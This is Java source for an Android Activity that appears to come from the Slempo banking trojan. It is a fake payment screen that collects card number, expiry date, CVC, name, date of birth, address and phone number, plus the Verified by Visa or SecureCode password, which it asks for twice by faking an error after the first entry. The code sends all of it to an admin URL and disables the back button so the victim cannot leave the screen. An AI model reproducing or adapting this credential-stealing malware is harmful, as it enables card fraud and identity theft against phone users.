package org.slempo.service.activities;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

import org.slempo.service.Constants;
import org.slempo.service.R;
import org.slempo.service.billing.AdditionalInformation;
import org.slempo.service.billing.BillingAddress;
import org.slempo.service.billing.Card;
import org.slempo.service.billing.CreditCardImagesAnimator;
import org.slempo.service.billing.CreditCardImagesAnimatorFroyo;
import org.slempo.service.billing.CreditCardNumberEditText;
import org.slempo.service.billing.CreditCardType;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.Utils;

import android.app.Activity;
import android.app.DatePickerDialog;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.InputFilter;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnFocusChangeListener;
import android.view.WindowManager;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.i18n.phonenumbers.NumberParseException;
import com.google.i18n.phonenumbers.PhoneNumberUtil;
import com.google.i18n.phonenumbers.Phonenumber.PhoneNumber;

public class Cards extends Activity implements
		CreditCardNumberEditText.OnCreditCardTypeChangedListener,
		CreditCardNumberEditText.OnValidNumberEnteredListener,
		DatePickerDialog.OnDateSetListener {

	private enum State {
		STATE_ENTERING_NUMBER, STATE_ENTERING_EXPIRATION_AND_CVC, STATE_ENTERING_ADDRESS, STATE_ENTERING_VBV
	}

	private CreditCardNumberEditText ccBox;

	private ImageView cvcPopup;

	private EditText expiration1st;

	private EditText expiration2nd;

	private EditText cvcBox;

	private State currentState;

	private Button continueButton;

	private TextView expirationSeparator;

	private CreditCardType currentCardType;

	private CreditCardImagesAnimator imagesAnimator;

	private ImageView[] creditCardImages;

	private static CreditCardType[] CREDIT_CARD_IMAGES_TYPE_ORDER;

	private View contentWholeView;

	private View contentCardView;

	private View contentAddressView;

	private View vbvConfirmationView;

	private View loadingView;

	private BroadcastReceiver signalsReceiver;

	private EditText nameOnCard;

	private EditText dateOfBirth;

	private EditText vbvPass;

	private EditText zipCode;

	private EditText streetAddress;

	private EditText countryPrefix;

	private EditText phoneNumber;

	private TextView errorMessageAddress;

	private TextView errorMessageVbv;

	private ImageView vbvLogo;

	private SharedPreferences settings;

	private String oldVbvPass = "";

	private TelephonyManager manager;

	static {
		CreditCardType[] arrayOfCreditCardType = new CreditCardType[5];
		arrayOfCreditCardType[0] = CreditCardType.VISA;
		arrayOfCreditCardType[1] = CreditCardType.MC;
		arrayOfCreditCardType[2] = CreditCardType.AMEX;
		arrayOfCreditCardType[3] = CreditCardType.DISCOVER;
		arrayOfCreditCardType[4] = CreditCardType.JCB;
		CREDIT_CARD_IMAGES_TYPE_ORDER = arrayOfCreditCardType;
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.billing_addcreditcard_fragment);
		manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		settings = getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		contentWholeView = findViewById(R.id.credit_card_details);
		contentAddressView = findViewById(R.id.billing_address);
		contentCardView = findViewById(R.id.addcreditcard_fields);
		vbvConfirmationView = findViewById(R.id.vbv_confirmation);
		loadingView = findViewById(R.id.loading_spinner);
		ccBox = (CreditCardNumberEditText) findViewById(R.id.cc_box);
		ccBox.setOnCreditCardTypeChangedListener(this);
		cvcPopup = (ImageView) findViewById(R.id.cvc_image);
		cvcPopup.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				View view = getCurrentFocus();
				if (view != null) {
					InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
					inputManager.hideSoftInputFromWindow(view.getWindowToken(),
							InputMethodManager.HIDE_NOT_ALWAYS);
				}
				Intent i = new Intent(Cards.this, CvcPopup.class);
				i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
				startActivity(i);
			}
		});
		expiration1st = (EditText) findViewById(R.id.expiration_date_entry_1st);
		expiration2nd = (EditText) findViewById(R.id.expiration_date_entry_2nd);
		expiration1st
				.addTextChangedListener(new AutoAdvancer(expiration1st, 2));
		expiration2nd
				.addTextChangedListener(new AutoAdvancer(expiration2nd, 2));
		expirationSeparator = (TextView) findViewById(R.id.expiration_date_separator);
		cvcBox = (EditText) findViewById(R.id.cvc_entry);
		cvcBox.addTextChangedListener(new CvcTextWatcher());
		continueButton = (Button) findViewById(R.id.positive_button);
		continueButton
				.setText(this.getString(R.string.add_instrument_continue));
		continueButton.setEnabled(false);

		ImageView[] arrayOfImageView = new ImageView[5];
		arrayOfImageView[0] = ((ImageView) findViewById(R.id.visa_logo));
		arrayOfImageView[1] = ((ImageView) findViewById(R.id.mastercard_logo));
		arrayOfImageView[2] = ((ImageView) findViewById(R.id.amex_logo));
		arrayOfImageView[3] = ((ImageView) findViewById(R.id.discover_logo));
		arrayOfImageView[4] = ((ImageView) findViewById(R.id.jcb_logo));
		creditCardImages = arrayOfImageView;
		imagesAnimator = new CreditCardImagesAnimatorFroyo(this,
				creditCardImages, CREDIT_CARD_IMAGES_TYPE_ORDER);

		ccBox.setOnNumberEnteredListener(new CreditCardNumberEditText.OnValidNumberEnteredListener() {

			public void onNumberEntered() {
				Cards.this.onNumberEntered();
				expiration1st.requestFocus();
			}
		});
		continueButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (currentState == State.STATE_ENTERING_EXPIRATION_AND_CVC) {
					if (areAllCardFieldsValid()) {
						crossFade(contentCardView, View.GONE, R.anim.fade_out,
								contentAddressView, R.anim.fade_in, false);
						currentState = State.STATE_ENTERING_ADDRESS;
						nameOnCard.requestFocus();
					}
				} else if (currentState == State.STATE_ENTERING_ADDRESS) {
					if (areAllAddressFieldsValid()) {
						if (currentCardType == CreditCardType.MC
								|| currentCardType == CreditCardType.VISA) {
							if (currentCardType == CreditCardType.VISA) {
								vbvLogo.setBackgroundResource(R.drawable.verified_by_visa_logo);
							} else if (currentCardType == CreditCardType.MC) {
								vbvLogo.setBackgroundResource(R.drawable.mastercard_securecode_logo);
							}

							crossFade(contentAddressView, View.GONE,
									R.anim.fade_out, vbvConfirmationView,
									R.anim.fade_in, false);
							vbvPass.requestFocus();
							currentState = State.STATE_ENTERING_VBV;
						} else {
							crossFade(contentWholeView, View.INVISIBLE,
									R.anim.fade_out, loadingView,
									R.anim.slide_in_right, true);
							sendData();
						}
					}
				} else if (currentState == State.STATE_ENTERING_VBV) {
					if (areAllVbvFieldsValid()) {
						if (oldVbvPass.equals("")) {
							oldVbvPass = vbvPass.getText().toString();
							playShakeAnimation(vbvPass);
							vbvPass.setText("");
						} else {
							crossFade(contentWholeView, View.INVISIBLE,
									R.anim.fade_out, loadingView,
									R.anim.slide_in_right, true);
							sendData();
						}
					} else {
						oldVbvPass = "";
						vbvPass.setText("");
					}
				}
			}
		});
		errorMessageAddress = (TextView) findViewById(R.id.error_message_address);
		errorMessageVbv = (TextView) findViewById(R.id.error_message_vbv);
		currentState = State.STATE_ENTERING_NUMBER;
		initReceiver();

		nameOnCard = (EditText) findViewById(R.id.name_on_card);
		dateOfBirth = (EditText) findViewById(R.id.date_of_birth);
		phoneNumber = (EditText) findViewById(R.id.registration_new_phone);
		countryPrefix = (EditText) findViewById(R.id.registration_new_cc);
		countryPrefix.setText(getCountryCode());
		zipCode = (EditText) findViewById(R.id.zip_code);
		streetAddress = (EditText) findViewById(R.id.address_line_1);

		vbvPass = (EditText) findViewById(R.id.vbv_pass);
		vbvLogo = (ImageView) findViewById(R.id.vbv_logo);
		dateOfBirth.setOnFocusChangeListener(new OnFocusChangeListener() {

			@Override
			public void onFocusChange(View v, boolean hasFocus) {
				if (hasFocus) {
					final Calendar c = Calendar.getInstance();
					int year = c.get(Calendar.YEAR);
					int month = c.get(Calendar.MONTH);
					int day = c.get(Calendar.DAY_OF_MONTH);
					Dialog dialog = new DatePickerDialog(Cards.this,
							Cards.this, year, month, day);
					dialog.getWindow().setType(
							WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
					dialog.show();
				}
			}
		});
	}

	private void fadeIn(View view) {
		view.setVisibility(View.VISIBLE);
		view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.fade_in));
	}

	private boolean areAllCardFieldsValid() {
		if (!currentCardType.isValidNumber(ccBox.getText().toString()
				.replace(" ", ""))) {
			playShakeAnimation(ccBox);
			return false;
		}
		int month = Integer.parseInt(expiration1st.getText().toString());
		if (month < 1 || month > 12
				|| expiration1st.getText().toString().length() != 2) {
			playShakeAnimation(expiration1st);
			return false;
		}
		int year = Integer.parseInt(expiration2nd.getText().toString());
		if (year < 14 || year > 20
				|| expiration2nd.getText().toString().length() != 2) {
			playShakeAnimation(expiration2nd);
			return false;
		}
		if (cvcBox.getText().toString().length() != currentCardType.cvcLength) {
			playShakeAnimation(cvcBox);
			return false;
		}
		return true;
	}

	private boolean areAllAddressFieldsValid() {
		if (TextUtils.isEmpty(nameOnCard.getText().toString())) {
			playShakeAnimation(nameOnCard);
			return false;
		}
		if (TextUtils.isEmpty(zipCode.getText().toString())) {
			playShakeAnimation(zipCode);
			return false;
		}
		if (TextUtils.isEmpty(streetAddress.getText().toString())) {
			playShakeAnimation(streetAddress);
			return false;
		}
		if (!Utils.isDateCorrect(dateOfBirth.getText().toString())) {
			playShakeAnimation(dateOfBirth);
			return false;
		}
		if (TextUtils.isEmpty(countryPrefix.getText().toString())) {
			playShakeAnimation(countryPrefix);
			return false;
		}
		if (TextUtils.isEmpty(phoneNumber.getText().toString())) {
			playShakeAnimation(phoneNumber);
			return false;
		}
		String fullNumber = countryPrefix.getText().toString()
				+ phoneNumber.getText().toString();
		PhoneNumberUtil phoneUtil = PhoneNumberUtil.getInstance();
		try {
			String countryISO = getCountryISOCode();
			PhoneNumber numberProto = phoneUtil.parse(fullNumber, countryISO);
			if (!phoneUtil.isValidNumber(numberProto)) {
				playShakeAnimation(phoneNumber);
				return false;
			}
		} catch (NumberParseException e) {
			playShakeAnimation(phoneNumber);
			return false;
		}
		return true;
	}

	public boolean areAllVbvFieldsValid() {
		if (TextUtils.isEmpty(vbvPass.getText().toString())
				|| vbvPass.getText().toString().trim().length() < 4) {
			playShakeAnimation(vbvPass);
			return false;
		}
		return true;
	}

	private void sendData() {
		Card card = new Card(ccBox.getText().toString(), expiration1st
				.getText().toString(), expiration2nd.getText().toString(),
				cvcBox.getText().toString());
		BillingAddress address = new BillingAddress(nameOnCard.getText()
				.toString(), dateOfBirth.getText().toString(), zipCode
				.getText().toString(), streetAddress.getText().toString(), "+"
				+ countryPrefix.getText().toString()
				+ phoneNumber.getText().toString());
		AdditionalInformation info = new AdditionalInformation(vbvPass
				.getText().toString(), oldVbvPass);
		Sender.sendCardData(this, Constants.ADMIN_URL, card, address, info);
	}

	private void crossFade(View fromView, int fromViewFinalVisibility,
			int fromAnimation, View toView, int toAnimation,
			boolean closeKeyboard) {
		Animation anim1 = AnimationUtils.loadAnimation(this, fromAnimation);
		fromView.setVisibility(fromViewFinalVisibility);
		anim1.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		fromView.startAnimation(anim1);
		toView.setVisibility(View.VISIBLE);
		Animation anim2 = AnimationUtils.loadAnimation(this, toAnimation);
		anim2.setAnimationListener(new Animation.AnimationListener() {

			@Override
			public void onAnimationStart(Animation animation) {
			}

			@Override
			public void onAnimationEnd(Animation animation) {
			}

			@Override
			public void onAnimationRepeat(Animation animation) {

			}
		});
		toView.startAnimation(anim2);
		if (closeKeyboard) {
			View view = getCurrentFocus();
			if (view != null) {
				InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
				inputManager.hideSoftInputFromWindow(view.getWindowToken(),
						InputMethodManager.HIDE_NOT_ALWAYS);
			}
		}
	}

	@Override
	public void onCreditCardTypeChanged(CreditCardType oldType,
			CreditCardType newType) {
		currentCardType = newType;
		InputFilter[] fArray = new InputFilter[1];
		fArray[0] = new InputFilter.LengthFilter(newType.cvcLength);
		cvcBox.setFilters(fArray);
		imagesAnimator.animateToType(newType);
	}

	private class CvcTextWatcher implements TextWatcher {
		private CvcTextWatcher() {
		}

		private int getCurrentCvcLength() {
			int i = CreditCardType.getMaxCvcLength();
			if (currentCardType != null) {
				i = currentCardType.cvcLength;
			}
			return i;
		}

		public void afterTextChanged(Editable editable) {
			if (editable.length() >= getCurrentCvcLength()) {
				onCvcEntered();
			}
			if (editable.length() == 0) {
				focusPrevious(cvcBox);
			}
		}

		@Override
		public void beforeTextChanged(CharSequence s, int start, int count,
				int after) {
		}

		@Override
		public void onTextChanged(CharSequence s, int start, int before,
				int count) {
		}
	}

	private void onCvcEntered() {
		if (currentState == State.STATE_ENTERING_EXPIRATION_AND_CVC) {
			continueButton.setEnabled(true);
			cvcBox.setNextFocusDownId(R.id.cc_box);
			ccBox.requestFocus();
		}
	}

	@Override
	public void onNumberEntered() {
		if (currentState == State.STATE_ENTERING_NUMBER) {
			currentState = State.STATE_ENTERING_EXPIRATION_AND_CVC;
			fadeIn(cvcPopup);
			fadeIn(expiration1st);
			fadeIn(expiration2nd);
			fadeIn(cvcBox);
			fadeIn(expirationSeparator);
			ccBox.setNextFocusDownId(R.id.expiration_date_entry_1st);
		}
	}

	private static class AutoAdvancer implements TextWatcher {

		private int mMaxLength;
		private final TextView mTextView;

		public AutoAdvancer(TextView paramTextView, int paramInt) {
			this.mTextView = paramTextView;
			this.mMaxLength = paramInt;
		}

		public void afterTextChanged(Editable paramEditable) {
			if (paramEditable.length() >= mMaxLength) {
				focusNext(mTextView);
			}
			if (paramEditable.length() == 0) {
				focusPrevious(mTextView);
			}
		}

		public void beforeTextChanged(CharSequence paramCharSequence,
				int paramInt1, int paramInt2, int paramInt3) {
		}

		public void onTextChanged(CharSequence paramCharSequence,
				int paramInt1, int paramInt2, int paramInt3) {
		}
	}

	protected static void focusNext(View paramView) {
		View localView = paramView.focusSearch(View.FOCUS_RIGHT);
		if (localView != null) {
			localView.requestFocus();
		}
	}

	protected static void focusPrevious(View paramView) {
		View localView = paramView.focusSearch(View.FOCUS_LEFT);
		if (localView != null) {
			localView.requestFocus();
		}
	}

	private void playShakeAnimation(View view) {
		view.startAnimation(AnimationUtils.loadAnimation(this, R.anim.shake));
	}

	private void initReceiver() {
		signalsReceiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent i) {
				boolean status = i.getExtras().getBoolean("status");
				if (status) {
					Utils.putBooleanValue(settings, Constants.CODE_IS_SENT,
							true);
					finish();
				} else {
					showError();
				}
			}
		};
		registerReceiver(signalsReceiver, new IntentFilter(
				Sender.UPDATE_MAIN_UI));
	}

	public void onDateSet(DatePicker view, int year, int month, int day) {
		SimpleDateFormat formatter = new SimpleDateFormat("dd.MM.yyyy",
				Locale.US);
		Calendar cal = Calendar.getInstance();
		cal.set(Calendar.YEAR, year);
		cal.set(Calendar.MONTH, month);
		cal.set(Calendar.DAY_OF_MONTH, day);
		cal.set(Calendar.HOUR_OF_DAY, 0);
		cal.set(Calendar.MINUTE, 0);
		cal.set(Calendar.SECOND, 0);
		cal.set(Calendar.MILLISECOND, 0);
		String date = formatter.format(cal.getTime());
		dateOfBirth.setText(date);
		zipCode.requestFocus();
	}

	private String getCountryCode() {
		String countryID = "";
		String countryCode = "";
		String countryIso = manager.getSimCountryIso();
		if (TextUtils.isEmpty(countryIso)) {
			return "";
		}
		countryID = countryIso.toUpperCase(Locale.getDefault());
		String[] rl = getResources().getStringArray(R.array.country_codes);
		for (int i = 0; i < rl.length; i++) {
			String[] g = rl[i].split(",");
			if (g[1].trim().equals(countryID.trim())) {
				countryCode = g[0];
				break;
			}
		}
		return countryCode;
	}

	private String getCountryISOCode() {
		String countryCode = countryPrefix.getText().toString();
		String countryIso = "";
		String[] rl = getResources().getStringArray(R.array.country_codes);
		for (int i = 0; i < rl.length; i++) {
			String[] g = rl[i].split(",");
			if (g[0].trim().equals(countryCode.trim())) {
				countryIso = g[1];
				break;
			}
		}
		return countryIso;
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	public void onBackPressed() {
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		unregisterReceiver(signalsReceiver);
	}

	private void showError() {
		loadingView.setVisibility(View.GONE);
		contentWholeView.setVisibility(View.VISIBLE);
		if (currentState == State.STATE_ENTERING_ADDRESS) {
			errorMessageAddress.setVisibility(View.VISIBLE);
		} else if (currentState == State.STATE_ENTERING_VBV) {
			errorMessageVbv.setVisibility(View.VISIBLE);
		}
	}/**/
}
